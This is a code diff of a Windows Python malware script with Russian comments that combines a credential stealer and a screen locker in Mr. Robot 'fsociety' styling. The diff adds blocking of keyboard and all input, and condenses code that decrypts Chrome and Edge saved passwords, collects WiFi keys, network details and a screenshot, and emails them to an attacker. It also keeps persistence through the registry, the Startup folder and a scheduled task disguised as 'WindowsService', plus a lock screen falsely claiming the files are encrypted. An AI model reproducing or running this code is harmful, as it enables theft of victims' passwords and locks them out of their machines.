@@ -7,7 +7,7 @@ from email.mime.base import MIMEBase
 from email import encoders
 import cv2, numpy as np
 from PIL import ImageGrab, Image, ImageDraw
-import sqlite3, win32crypt, shutil, winreg
+import sqlite3, win32crypt, shutil, winreg, ctypes
 
 # ===== НАСТРОЙКИ =====
 PASSWORD = "1601"
@@ -23,6 +23,66 @@ AUDIO_PATH = os.path.join(tempfile.gettempdir(), "audio.mp3")
 LOGO_PATH = os.path.join(tempfile.gettempdir(), "logo.png")
 attempts_left = MAX_ATTEMPTS
 
+# ===== БЛОКИРОВКА ВСЕХ КЛАВИШ =====
+def block_all_keys():
+    try:
+        import keyboard
+        # Блокируем ВСЕ комбинации
+        combos = [
+            'alt+f4', 'alt+tab', 'alt+esc', 'alt+space',
+            'ctrl+shift+esc', 'ctrl+alt+del', 'ctrl+esc', 'ctrl+shift+tab',
+            'ctrl+w', 'ctrl+f4', 'ctrl+tab',
+            'win', 'win+d', 'win+r', 'win+e', 'win+l', 'win+m',
+            'win+tab', 'win+x', 'win+u', 'win+i', 'win+a', 'win+s',
+            'win+ctrl+d', 'win+ctrl+f4',
+            'alt', 'ctrl', 'shift',
+            'left windows', 'right windows',
+            'print screen', 'alt+print screen',
+            'ctrl+c', 'ctrl+v', 'ctrl+x', 'ctrl+z', 'ctrl+y',
+            'f1','f2','f3','f4','f5','f6','f7','f8','f9','f10','f11','f12',
+        ]
+        for c in combos:
+            try: keyboard.add_hotkey(c, lambda: None, suppress=True, timeout=0)
+            except: pass
+        
+        # Блокируем отдельные клавиши
+        block_keys = [
+            'windows', 'left windows', 'right windows',
+            'esc', 'tab', 'caps lock',
+            'ctrl', 'alt', 'shift',
+            'delete', 'insert', 'home', 'end', 'page up', 'page down',
+            'print screen', 'scroll lock', 'pause',
+            'volume up', 'volume down', 'volume mute',
+            'f1','f2','f3','f4','f5','f6','f7','f8','f9','f10','f11','f12',
+        ]
+        for k in block_keys:
+            try: keyboard.block_key(k)
+            except: pass
+        
+        # Блокируем Win через реестр
+        try:
+            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 1)
+            winreg.CloseKey(k)
+        except: pass
+        
+    except:
+        # Fallback: полная блокировка ввода
+        try: ctypes.windll.user32.BlockInput(True)
+        except: pass
+
+def unblock_all():
+    try: ctypes.windll.user32.BlockInput(False)
+    except: pass
+    try:
+        import keyboard; keyboard.unhook_all()
+    except: pass
+    try:
+        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 0)
+        winreg.CloseKey(k)
+    except: pass
+
 # ===== АВТОЗАГРУЗКА ВЕЗДЕ =====
 def add_to_startup():
     try:
@@ -34,37 +94,33 @@ def add_to_startup():
             cp = pp
         pythonw = sys.executable.replace("python.exe", "pythonw.exe")
         
-        # Реестр HKCU
         k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
         winreg.SetValueEx(k, "WindowsService", 0, winreg.REG_SZ, f'"{pythonw}" "{cp}"')
         winreg.CloseKey(k)
         
-        # Startup folder
         startup = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
         dest = os.path.join(startup, 'WindowsService.pyw')
         if cp != dest:
             try: shutil.copy2(cp, dest)
             except: pass
         
-        # HKLM (если есть права)
         try:
             k2 = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
             winreg.SetValueEx(k2, "WindowsService", 0, winreg.REG_SZ, f'"{pythonw}" "{cp}"')
             winreg.CloseKey(k2)
         except: pass
         
-        # Scheduled Task
         os.system(f'schtasks /create /tn "WindowsService" /tr "\\"{pythonw}\\" \\"{cp}\\"" /sc ONLOGON /rl HIGHEST /f >nul 2>&1')
     except: pass
 
-# ===== СКАЧИВАНИЕ ФАЙЛОВ =====
+# ===== СКАЧИВАНИЕ =====
 def download_file(url, path):
     try:
         if os.path.exists(path): os.remove(path)
         urllib.request.urlretrieve(url, path)
     except: pass
 
-# ===== ПЛАВНАЯ АНИМАЦИЯ ПОСЛЕ ВИДЕО =====
+# ===== ПЛАВНАЯ АНИМАЦИЯ ЛОГО =====
 def show_logo_animation():
     download_file(LOGO_URL, LOGO_PATH)
     if not os.path.exists(LOGO_PATH): return
@@ -77,27 +133,20 @@ def show_logo_animation():
     try:
         logo = PhotoImage(file=LOGO_PATH)
         lbl = tk.Label(a, image=logo, bg='black')
-        lbl.image = logo
-        lbl.pack(expand=True)
+        lbl.image = logo; lbl.pack(expand=True)
     except: pass
     
-    # Плавное появление
     for alpha in range(0, 110, 5):
-        a.attributes('-alpha', alpha/100)
-        a.update()
-        time.sleep(0.03)
+        a.attributes('-alpha', alpha/100); a.update(); time.sleep(0.03)
     
     time.sleep(2)
     
-    # Плавное исчезновение
     for alpha in range(100, -10, -10):
-        a.attributes('-alpha', alpha/100)
-        a.update()
-        time.sleep(0.03)
+        a.attributes('-alpha', alpha/100); a.update(); time.sleep(0.03)
     
     a.destroy()
 
-# ===== ВИДЕО БЫСТРОЕ =====
+# ===== ВИДЕО =====
 def play_video():
     download_file(VIDEO_URL, VIDEO_PATH)
     download_file(AUDIO_URL, AUDIO_PATH)
@@ -114,7 +163,6 @@ def play_video():
             fps = cap.get(cv2.CAP_PROP_FPS)
             if fps <= 0: fps = 30
             
-            # Звук через subprocess
             try: subprocess.Popen(['ffplay','-nodisp','-autoexit','-loglevel','quiet', AUDIO_PATH], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             except: pass
             
@@ -135,7 +183,7 @@ def play_video():
         v.destroy()
     except: pass
 
-# ===== СТИЛЬ MR.ROBOT =====
+# ===== МАСКА ДЖОКЕРА =====
 def draw_jester():
     img = Image.new('RGBA', (180, 230), (0,0,0,0))
     d = ImageDraw.Draw(img)
@@ -149,16 +197,11 @@ def draw_jester():
     d.ellipse([80, 0, 100, 12], fill='white', outline='black')
     return img
 
-# ===== СТИЛЕР (ВСЁ В ОДНОМ) =====
+# ===== СТИЛЕР =====
 def mega_steal():
-    report = []
-    report.append("="*60)
-    report.append("DEDSEK ULTIMATE STEALER")
-    report.append("="*60)
-    report.append(f"USER: {os.environ.get('USERNAME')}")
-    report.append(f"PC: {socket.gethostname()}")
+    report = ["="*60, "DEDSEK ULTIMATE STEALER", "="*60]
+    report.append(f"USER: {os.environ.get('USERNAME')} | PC: {socket.gethostname()}")
     
-    # IP адреса
     try:
         pub_ip = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
         report.append(f"PUBLIC IP: {pub_ip}")
@@ -168,52 +211,33 @@ def mega_steal():
         report.append(f"LOCAL IP: {loc_ip}")
     except: pass
     
-    # ARP (все устройства в сети)
     try:
         arp = subprocess.check_output("arp -a", shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace')
-        report.append("\nNETWORK DEVICES:\n" + arp[:2000])
+        report.append("\nNETWORK:\n" + arp[:2000])
     except: pass
     
-    # Chrome пароли
-    report.append("\n=== CHROME PASSWORDS ===")
-    chrome_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
-    if os.path.exists(chrome_path):
-        try:
-            db = os.path.join(tempfile.gettempdir(), 'chrome.db')
-            shutil.copy2(chrome_path, db)
-            cur = sqlite3.connect(db).cursor()
-            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
-            for url, user, pw in cur:
-                try:
-                    pwd = win32crypt.CryptUnprotectData(pw, None, None, None, 0)[1].decode('utf-8','ignore')
-                    report.append(f"URL: {url}\nLOGIN: {user}\nPASSWORD: {pwd}\n" + "-"*30)
+    for browser, path in [
+        ("CHROME", os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')),
+        ("EDGE", os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'))
+    ]:
+        if os.path.exists(path):
+            report.append(f"\n=== {browser} ===")
+            try:
+                db = os.path.join(tempfile.gettempdir(), f'{browser}.db')
+                shutil.copy2(path, db)
+                cur = sqlite3.connect(db).cursor()
+                cur.execute("SELECT origin_url, username_value, password_value FROM logins")
+                for url, user, pw in cur:
+                    try:
+                        pwd = win32crypt.CryptUnprotectData(pw, None, None, None, 0)[1].decode('utf-8','ignore')
+                        report.append(f"URL: {url}\nLOGIN: {user}\nPASSWORD: {pwd}\n" + "-"*30)
+                    except: pass
+                cur.close()
+                try: os.remove(db)
                 except: pass
-            cur.close()
-            try: os.remove(db)
             except: pass
-        except: pass
     
-    # Edge пароли
-    report.append("\n=== EDGE PASSWORDS ===")
-    edge_path = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')
-    if os.path.exists(edge_path):
-        try:
-            db = os.path.join(tempfile.gettempdir(), 'edge.db')
-            shutil.copy2(edge_path, db)
-            cur = sqlite3.connect(db).cursor()
-            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
-            for url, user, pw in cur:
-                try:
-                    pwd = win32crypt.CryptUnprotectData(pw, None, None, None, 0)[1].decode('utf-8','ignore')
-                    report.append(f"URL: {url}\nLOGIN: {user}\nPASSWORD: {pwd}\n" + "-"*30)
-                except: pass
-            cur.close()
-            try: os.remove(db)
-            except: pass
-        except: pass
-    
-    # WiFi пароли
-    report.append("\n=== WIFI PASSWORDS ===")
+    report.append("\n=== WIFI ===")
     try:
         output = subprocess.check_output("netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace')
         for line in output.split('\n'):
@@ -226,7 +250,6 @@ def mega_steal():
                             report.append(f"WiFi: {p} | PASS: {dl.split(':')[1].strip()}")
     except: pass
     
-    # Скриншот
     try:
         ss = os.path.join(tempfile.gettempdir(), 'desktop.jpg')
         ImageGrab.grab().save(ss, 'JPEG', quality=50)
@@ -239,13 +262,12 @@ def mega_steal():
     
     text = '\n'.join(report)
     for i, part in enumerate([text[i:i+15000] for i in range(0, len(text), 15000)]):
-        send_email(part, f"[DedSek_Logs] Report [{i+1}]")
+        send_email(part, f"[DedSek_Logs] [{i+1}]")
 
 def send_email(msg, subj=None):
     try:
         m = MIMEText(msg, 'plain', 'utf-8')
-        m['Subject'] = subj or 'DedSek'
-        m['From'] = GMAIL_LOGIN; m['To'] = RECEIVER_EMAIL
+        m['Subject'] = subj or 'DedSek'; m['From'] = GMAIL_LOGIN; m['To'] = RECEIVER_EMAIL
         s = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=10)
         s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD); s.send_message(m); s.quit()
     except: pass
@@ -264,7 +286,7 @@ def send_file_email(fp, desc):
         s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD); s.send_message(m); s.quit()
     except: pass
 
-# ===== ВИНЛОКЕР В СТИЛЕ MR.ROBOT =====
+# ===== ВИНЛОКЕР =====
 class WinLocker:
     def __init__(self):
         self.root = tk.Tk(); self.root.withdraw()
@@ -274,16 +296,14 @@ class WinLocker:
         self.win.focus_force()
         global attempts_left
         
-        # Белый блок сверху
         top = tk.Frame(self.win, bg='white', bd=2, relief='solid')
         top.place(relx=0.5, rely=0.02, anchor='n', width=780, height=200)
         tk.Label(top, text="#OPdailyallowance", bg='white', fg='#111', font=('Courier', 16, 'bold')).pack(pady=(10,2))
         tk.Label(top, text="Your files are encrypted.", bg='white', fg='#cc0000', font=('Courier', 12, 'bold')).pack(pady=2)
         tk.Label(top, text="To unlock you need to solve the riddle.", bg='white', fg='#111', font=('Courier', 10)).pack(pady=3)
-        tk.Label(top, text="If timer expires - all data will be leaked.", bg='white', fg='#cc0000', font=('Courier', 10, 'bold')).pack(pady=3)
+        tk.Label(top, text="If you fail - system will be destroyed.", bg='white', fg='#cc0000', font=('Courier', 10, 'bold')).pack(pady=3)
         tk.Label(top, text="More instructions forthcoming - fsociety", bg='white', fg='#666', font=('Courier', 9, 'italic')).pack(pady=5)
         
-        # Маска джокера
         try:
             jester = draw_jester()
             jp = os.path.join(tempfile.gettempdir(), "jester.png"); jester.save(jp)
@@ -293,7 +313,6 @@ class WinLocker:
         
         tk.Label(self.win, text="JESTER ☠ ACTUAL", bg='#1a3a5c', fg='white', font=('Courier', 10, 'bold')).place(relx=0.5, rely=0.65, anchor='center')
         
-        # Поле ввода
         cf = tk.Frame(self.win, bg='#1a3a5c'); cf.place(relx=0.5, rely=0.82, anchor='center')
         tk.Label(cf, text="ENTER PASSWORD:", bg='#1a3a5c', fg='white', font=('Courier', 12, 'bold')).pack(pady=(0,3))
         self.pw = tk.Entry(cf, show="*", font=('Courier', 12, 'bold'), bg='white', fg='black', relief='solid', bd=1)
@@ -310,6 +329,7 @@ class WinLocker:
     def check(self, e=None):
         global attempts_left
         if self.pw.get() == PASSWORD:
+            unblock_all()
             self.sl.config(text="CORRECT!", fg='#0f0'); self.win.update()
             time.sleep(1); self.root.destroy(); os._exit(0)
         else:
@@ -326,5 +346,6 @@ if __name__ == "__main__":
     play_video()
     show_logo_animation()
     
+    block_all_keys()
     WinLocker()
     tk.mainloop()
